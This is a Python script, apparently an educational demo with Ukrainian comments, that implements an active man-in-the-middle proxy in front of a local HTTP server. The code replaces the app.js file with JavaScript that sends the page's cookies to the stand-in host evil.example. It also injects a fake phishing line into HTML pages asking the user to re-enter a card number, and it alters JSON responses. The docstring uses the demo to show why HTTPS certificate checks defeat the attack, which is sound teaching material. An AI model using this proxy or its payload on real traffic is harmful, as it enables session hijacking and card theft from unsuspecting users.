#!/usr/bin/env python3
"""Демо активного MitM: проксі :8082 -> upstream, підміняє HTML/JS у відповідях.

Для HTTP (upstream http://127.0.0.1:8081) підміна непомітна для клієнта.
Для HTTPS атакувальник не має ключа сервера, тому може лише видати власний
сертифікат — клієнт з перевіркою CA розірве з'єднання.
"""
import argparse

import httpx
import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import Response

EVIL_JS = b"fetch('http://evil.example/steal?c='+document.cookie);"
app = FastAPI()
UPSTREAM = "http://127.0.0.1:8081"


@app.api_route("/{path:path}", methods=["GET", "POST"])
async def proxy(path: str, request: Request):
    async with httpx.AsyncClient() as c:
        r = await c.request(request.method, f"{UPSTREAM}/{path}", params=request.query_params,
                            content=await request.body(),
                            headers={k: v for k, v in request.headers.items() if k != "host"})
    body = r.content
    if path == "static/app.js":
        body = EVIL_JS                                   # підміна скрипта
    elif b"<h1>" in body:
        body = body.replace(b"</h1>", b"</h1><p style='color:red'>Your session expired, "
                                      b"re-enter card number</p>")  # підміна контенту
    elif body.startswith(b"{"):
        body = body.replace(b'"ok":true', b'"ok":true,"injected":"MitM"')
    hdrs = {k: v for k, v in r.headers.items()
            if k.lower() not in ("content-length", "content-encoding", "transfer-encoding")}
    return Response(body, status_code=r.status_code, headers=hdrs)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8082)
    a = ap.parse_args()
    uvicorn.run(app, host="127.0.0.1", port=a.port, log_level="warning")
